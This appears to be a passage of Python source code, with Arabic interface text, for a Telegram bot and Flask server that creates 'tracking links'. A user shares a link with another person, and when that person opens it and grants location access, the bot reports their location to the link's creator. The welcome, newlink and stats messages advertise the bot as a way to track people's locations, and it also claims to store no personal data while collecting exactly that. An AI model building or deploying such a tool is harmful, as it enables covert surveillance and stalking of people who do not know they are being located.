            <a href="/" style="padding: 10px 20px; background: #667eea; color: white; text-decoration: none; border-radius: 5px;">
                العودة للرئيسية
            </a>
            <a href="/health" style="padding: 10px 20px; background: #48bb78; color: white; text-decoration: none; border-radius: 5px; margin-right: 10px;">
                فحص الصحة
            </a>
        </div>
    </body>
    </html>
    '''

# ========== معالجات البوت ==========

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    """معالجة أمر البداية والمساعدة"""
    user_id = message.from_user.id
    user_name = message.from_user.first_name
    
    welcome_message = f"""
🎯 **مرحباً {user_name} في بوت التتبع الآمن!**

🤖 **أنا بوت متخصص في تتبع المواقع الجغرافية بأمان تام.**

🔐 **مميزات البوت:**
• إنشاء روابط تتبع فريدة
• إشعارات فورية عند تحديد الموقع
• روابط تنتهي تلقائياً بعد 24 ساعة
• حماية خصوصية كاملة

🚀 **الأوامر المتاحة:**
📍 `/newlink` - إنشاء رابط تتبع جديد
📊 `/mylinks` - عرض روابطي النشطة
🔄 `/reset` - حذف جميع روابطي
📈 `/stats` - إحصائياتي
❓ `/help` - المساعدة
🔧 `/status` - حالة البوت

💡 **للبدء، أرسل:** `/newlink`

📞 **للإبلاغ عن مشكلة أو اقتراح:**
تواصل مع المطور مباشرة.
"""
    
    bot.send_message(message.chat.id, welcome_message, parse_mode='Markdown')
    
    # حفظ بيانات المستخدم
    if user_id not in user_data:
        user_data[user_id] = {
            'name': user_name,
            'total_links': 0,
            'active_links': 0,
            'created_at': datetime.now(),
            'last_activity': datetime.now()
        }
    else:
        user_data[user_id]['last_activity'] = datetime.now()
    
    logger.info(f"مستخدم جديد: {user_name} (ID: {user_id})")

@bot.message_handler(commands=['newlink'])
def create_new_link(message):
    """إنشاء رابط تتبع جديد"""
    try:
        user_id = message.from_user.id
        chat_id = message.chat.id
        
        # إنشاء الرابط
        tracking_url, tracking_id = create_tracking_link(chat_id, user_id)
        
        if tracking_url:
            response = f"""
✅ **تم إنشاء رابط تتبع جديد!**

🔗 **الرابط:** 
`{tracking_url}`

🆔 **الكود:** `{tracking_id}`
⏰ **الصلاحية:** 24 ساعة
📊 **الحالة:** نشط 🔵

📋 **طريقة الاستخدام:**
1. شارك هذا الرابط مع الشخص المطلوب
2. عند فتح الرابط، سيطلب الإذن للوصول للموقع
3. سيصلك إشعار فوري عند تحديد الموقع

⚠️ **ملاحظات مهمة:**
• الرابط ينتهي تلقائياً بعد 24 ساعة
• يمكنك إدارة روابطك بـ `/mylinks`
• يمكنك حذف جميع روابطك بـ `/reset`

🔐 **خصوصية:**
• لا يتم تخزين أي بيانات شخصية
• الروابط مشفرة وآمنة
            """
            
            bot.send_message(chat_id, response, parse_mode='Markdown')
            logger.info(f"تم إنشاء رابط للمستخدم {user_id}: {tracking_id}")
        else:
            bot.send_message(chat_id, "❌ حدث خطأ في إنشاء الرابط. يرجى المحاولة لاحقاً.")
            
    except Exception as e:
        logger.error(f"خطأ في إنشاء الرابط: {e}")
        bot.send_message(message.chat.id, "❌ حدث خطأ غير متوقع. يرجى المحاولة مرة أخرى.")

@bot.message_handler(commands=['mylinks'])
def show_user_links(message):
    """عرض روابط المستخدم"""
    try:
        user_id = message.from_user.id
        
        # البحث عن روابط المستخدم النشطة
        user_links = []
        for track_id, info in tracking_links.items():
            if info['user_id'] == user_id and info['active']:
                expires_in = info['expires_at'] - datetime.now()
                if expires_in.total_seconds() > 0:
                    hours_left = expires_in.total_seconds() / 3600
                    user_links.append({
                        'id': track_id,
                        'created': info['created_at'],
                        'hours_left': int(hours_left),
                        'visits': info.get('visits', 0),
                        'tracks': info.get('successful_tracks', 0)
                    })
        
        if not user_links:
            bot.send_message(
                message.chat.id,
                "📭 **لا توجد روابط نشطة حالياً**\n\nاستخدم الأمر `/newlink` لإنشاء رابط جديد.",
                parse_mode='Markdown'
            )
            return
        
        # ترتيب الروابط حسب وقت الإنشاء
        user_links.sort(key=lambda x: x['created'], reverse=True)
        
        # إنشاء رسالة الروابط
        response = "🔗 **روابطك النشطة:**\n\n"
        for i, link in enumerate(user_links, 1):
            url = f'https://{DOMAIN}/track/{link["id"]}'
            response += f"**{i}. الرابط:** `{link['id']}`\n"
            response += f"   ⏰ **متبقي:** {link['hours_left']} ساعة\n"
            response += f"   👁️ **الزيارات:** {link['visits']}\n"
            response += f"   📍 **التتبعات:** {link['tracks']}\n"
            response += f"   🔗 **الرابط:** {url}\n\n"
        
        response += f"📊 **الإجمالي:** {len(user_links)} رابط نشط\n\n"
        response += "⚠️ **ملاحظة:** الروابط تنتهي تلقائياً بعد 24 ساعة من إنشائها"
        
        bot.send_message(message.chat.id, response, parse_mode='Markdown')
        
    except Exception as e:
        logger.error(f"خطأ في عرض الروابط: {e}")
        bot.send_message(message.chat.id, "❌ حدث خطأ في عرض الروابط.")

@bot.message_handler(commands=['reset'])
def reset_user_links(message):
    """حذف جميع روابط المستخدم"""
    try:
        user_id = message.from_user.id
        deleted_count = 0
        
        # البحث عن روابط المستخدم وحذفها
        for track_id in list(tracking_links.keys()):
            if tracking_links[track_id]['user_id'] == user_id:
                del tracking_links[track_id]
                deleted_count += 1
        
        # تحديث بيانات المستخدم
        if user_id in user_data:
            user_data[user_id]['active_links'] = 0
        
        if deleted_count > 0:
            bot.send_message(
                message.chat.id,
                f"✅ **تم الحذف بنجاح!**\n\nتم حذف **{deleted_count}** رابط تتبع.",
                parse_mode='Markdown'
            )
            logger.info(f"تم حذف {deleted_count} رابط للمستخدم {user_id}")
        else:
            bot.send_message(
                message.chat.id,
                "ℹ️ **لا توجد روابط لحذفها**\n\nلم يتم العثور على أي روابط نشطة لحسابك.",
                parse_mode='Markdown'
            )
            
    except Exception as e:
        logger.error(f"خطأ في حذف الروابط: {e}")
        bot.send_message(message.chat.id, "❌ حدث خطأ في حذف الروابط.")

@bot.message_handler(commands=['stats'])
def show_user_stats(message):
    """عرض إحصائيات المستخدم"""
    try:
        user_id = message.from_user.id
        
        if user_id in user_data:
            user_info = user_data[user_id]
            
            # حساب الروابط النشطة
            active_links = sum(1 for link in tracking_links.values() 
                              if link['user_id'] == user_id and link['active'])
            
            # حساب إجمالي التتبعات
            total_tracks = sum(link.get('successful_tracks', 0) 
                              for link in tracking_links.values() 
                              if link['user_id'] == user_id)
            
            response = f"""
📊 **إحصائيات حسابك:**

👤 **الاسم:** {user_info.get('name', 'غير معروف')}
🆔 **المعرف:** `{user_id}`

🔗 **الروابط:**
• إجمالي الروابط: {user_info.get('total_links', 0)}
• روابط نشطة: {active_links}

📍 **التتبعات:**
• إجمالي التتبعات: {total_tracks}

📅 **النشاط:**
• تاريخ الإنشاء: {user_info.get('created_at', datetime.now()).strftime('%Y/%m/%d')}
• آخر نشاط: {user_info.get('last_activity', datetime.now()).strftime('%Y/%m/%d %I:%M %p')}

🎯 **نصيحة:** استمر في إنشاء الروابط لتتبع المزيد من المواقع!
            """
        else:
            response = """
📊 **إحصائيات حسابك:**

ℹ️ **لم يتم العثور على إحصائيات لحسابك**
قد يكون هذا أول مرة تستخدم فيها البوت.

🚀 **ابدأ الآن:** أرسل `/newlink` لإنشاء أول رابط تتبع لك!
            """
        
        bot.send_message(message.chat.id, response, parse_mode='Markdown')
        
    except Exception as e:
        logger.error(f"خطأ في عرض الإحصائيات: {e}")
        bot.send_message(message.chat.id, "❌ حدث خطأ في عرض الإحصائيات.")

@bot.message_handler(commands=['status'])
def show_bot_status(message):
    """عرض حالة البوت والخادم"""
    try:
        webhook_info = bot.get_webhook_info()
        active_links = sum(1 for link in tracking_links.values() if link['active'])
        
        status_message = f"""
🟢 **حالة النظام:**

🤖 **البوت:** نشط وجاهز
🌐 **الخادم:** يعمل بشكل طبيعي
🔗 **الروابط النشطة:** {active_links}
👥 **المستخدمين:** {len(user_data)}

🌍 **معلومات الاتصال:**
• **Webhook:** {webhook_info.url or 'غير مضبوط'}
• **آخر خطأ:** {webhook_info.last_error_date or 'لا يوجد'}
• **الاتصالات:** {webhook_info.max_connections or 40}

🕒 **الوقت الحالي:** {datetime.now().strftime('%Y/%m/%d %I:%M:%S %p')}

🔧 **روابط مهمة:**
• [فحص الخادم](https://{DOMAIN}/health)
• [الصفحة الرئيسية](https://{DOMAIN}/)
• [إعداد Webhook](https://{DOMAIN}/setup)

💡 **نصائح:**
• إذا لم تستقبل رسائل، أرسل `/start` مجدداً
• تأكد من تفعيل الإشعارات في Telegram
• للدعم الفني، تواصل مع المطور
        """
        
        bot.send_message(message.chat.id, status_message, parse_mode='Markdown')
        
    except Exception as e:
        logger.error(f"خطأ في عرض الحالة: {e}")
        bot.send_message(message.chat.id, "❌ حدث خطأ في عرض حالة النظام.")

# ========== التنظيف التلقائي ==========

def cleanup_expired_links():
    """تنظيف الروابط المنتهية تلقائياً"""
    while True:
        try:
            now = datetime.now()
            expired_count = 0
            
            for track_id in list(tracking_links.keys()):
                if tracking_links[track_id]['expires_at'] < now:
                    # تحديث إحصائيات المستخدم
                    user_id = tracking_links[track_id]['user_id']
                    if user_id in user_data:
                        user_data[user_id]['active_links'] = max(0, user_data[user_id].get('active_links', 0) - 1)
                    
                    del tracking_links[track_id]
                    expired_count += 1
            
            if expired_count > 0:
                logger.info(f"تم تنظيف {expired_count} رابط منتهي")
            
            # الانتظار 5 دقائق قبل التنظيف التالي
            time.sleep(300)
            
        except Exception as e:
            logger.error(f"خطأ في التنظيف التلقائي: {e}")
            time.sleep(60)

# ========== بدء التشغيل ==========

app_start_time = time.time()

if __name__ == '__main__':
    # بدء التنظيف التلقائي في خيط منفصل
    cleanup_thread = threading.Thread(target=cleanup_expired_links, daemon=True)
    cleanup_thread.start()
    
    # إعداد Webhook
    try:
        logger.info("جاري إعداد Webhook...")
        bot.remove_webhook()
        time.sleep(1)
        bot.set_webhook(url=WEBHOOK_URL)
        logger.info(f"✅ تم إعداد Webhook بنجاح: {WEBHOOK_URL}")
        
        # الحصول على معلومات البوت
        bot_info = bot.get_me()
        logger.info(f"✅ البوت جاهز: @{bot_info.username}")
        
    except Exception as e:
        logger.error(f"❌ خطأ في إعداد Webhook: {e}")
    
    # تشغيل خادم Flask
    port = int(os.environ.get('PORT', 10000))
    logger.info(f"🚀 بدء تشغيل الخادم على المنفذ {port}")
    app.run(host='0.0.0.0', port=port, debug=False)